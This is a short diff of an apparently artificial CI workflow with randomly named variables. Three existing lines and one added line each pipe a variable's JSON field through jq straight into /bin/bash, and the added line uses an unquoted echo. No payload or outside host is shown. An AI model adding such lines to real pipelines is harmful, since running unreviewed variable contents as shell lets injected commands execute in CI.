@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$rpi406" | jq -r .ugi4097 | /bin/bash
           printf '%s' "$y64431" | jq -r .pyfvh3 | /bin/bash
           printf '%s' "$nkzc4432" | jq -r .gg3151 | /bin/bash
+          echo $wx247 | jq -r .p154 | /bin/bash
 
       - name: Persist output
         if: always()
